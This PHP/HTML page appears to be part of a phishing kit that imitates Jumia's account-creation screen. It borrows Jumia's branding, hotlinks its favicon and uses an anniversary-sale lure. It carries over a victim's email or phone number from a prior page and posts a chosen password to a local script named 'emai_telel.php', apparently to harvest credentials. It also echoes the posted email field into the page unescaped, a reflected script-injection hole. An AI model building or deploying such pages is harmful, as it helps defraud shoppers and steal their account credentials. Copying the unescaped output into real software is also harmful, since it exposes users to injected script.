<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
    <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
</head>
<body>
    <?php 
    if (!isset($_POST['num_email']) ) {
        header('Location: connexion.php');
    }
    ?>

    <div style="display: flex; flex-direction: column; height: 100%; width: 480px; margin: 0 auto; min-height: 500px; max-width: 100%; font-family: Roboto, sans-serif;">
        <div style="margin-bottom: 30px;"></div>
        
        <div class="header" style="display: flex; align-items: center; height: 64px; justify-content: center; margin: 0 0 8px; position: relative;">
            <img class="logo" src="../images/logojum" width="69" height="67">
        </div>
 
        <div class="card" style="background-color: #fff; border-radius: 4px; padding: 8px 24px;">
            <form method="post" action="emai_telel.php" onsubmit="return verification()">
                <div style="display: block; margin-top: 12px;">
                    <div style="text-align: center; display: block;">
                        <h2 style="font-size: 20px; font-weight: bold; margin: 0;">Créez votre compte</h2>
                        <p style="font-size: 16px; font-weight: 400; line-height: 1.5em; margin: 8px 0 16px; color: #4a4a4a; text-align: center;">
                            Commençons par créer votre compte.<br>
                            Pour assurer la sécurité de votre compte, nous avons besoin d'un mot de passe fort!
                        </p>
                    </div>

                    <div style="margin: 32px 0 16px; display: flex; padding: 16px; background-color: #eee;">
                        <div style="flex: 1; display: block;">
                            <?php echo $_POST['num_email']; ?>
                        </div>
                        <div style="color: #f69f4e;">
                            <a href="connexion.php" onclick="submitForm();" style="text-decoration: none; color: #f69f4e;">Modifier</a>
                        </div>
                    </div>

                    <div class="ps" style="padding-top: 16px; display: flex;">
                        <input class="pasw" type="password" name="password" placeholder="Mot de passe" style="border: 1px solid rgb(150, 149, 149); border-radius: 4px; outline: 0; flex: 1; height: 51px; padding-left: 15px; font-size: 16px;">
                    </div>

                    <div class="confps" style="padding-top: 16px; display: flex; margin-top: 16px;">
                        <input class="pasw" type="password" name="confirmation_password" placeholder="Confirmer le mot de passe" style="border: 1px solid rgb(150, 149, 149); border-radius: 4px; outline: 0; flex: 1; height: 51px; padding-left: 15px; font-size: 16px;">
                    </div>

                    <div style="margin-top: 19px;">
                        <p id="red_er" style="visibility: hidden; margin: 0; flex: 100%; font-size: 15px; color: red; padding-left: 10px; padding-top: 5px; margin-bottom: 20px;">Les mots de passe ne correspondent pas.</p>

                        <input type="hidden" name="num_email" value="<?php echo $_POST['num_email']; ?>">

                        <input type="submit" value="Continuer" style="width: 100%; font-size: 16px; font-weight: bold; color: white; background-color: #f8982d; border: 0; padding: 16px 0px; border-radius: 4px; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.5); cursor: pointer;">
                    </div>
                </div>
            </form>
        </div>

        <div style="padding: 8px 0; text-align: center; display: flex;">
            <div class="text" style="font-size: 14px; line-height: 24px; padding: 0 24px; position: relative; text-align: center; width: 100%; flex: 1;">
                Si besoin d'aide, merci de vous référer au Centre d'Assistance ou de contacter notre service client.
            </div>
        </div>

        <div class="logo444" style="display: flex; justify-content: center; margin-top: 25px;">
            <img src="../images/jumi" width="90" height="17">
        </div>
    </div>





    <script>
        function verification() {
            document.getElementById('red_er').style.visibility = 'hidden';
            const password = document.querySelector('input[name="password"]');
            const confirmation_password = document.querySelector('input[name="confirmation_password"]');
            let errorMessage = "";
            
            if (password.value !== confirmation_password.value) {
                errorMessage ="Les mots de passe ne correspondent pas.";
                
            }
            if(password.value.trim() === "" || confirmation_password.value.trim() === ""){
                errorMessage ="Les champs de mot de passe ne peuvent pas être vides.";
                
            }
            if (password.value.length < 8) {
                errorMessage ="Le mot de passe doit contenir au moins 8 caractères.";
            }

            if(errorMessage!==""){
                document.getElementById('red_er').style.visibility = 'visible';
                document.getElementById('red_er').textContent=errorMessage;
                return false;
            }
            return true;
        }
    </script>

    
</body>
</html>
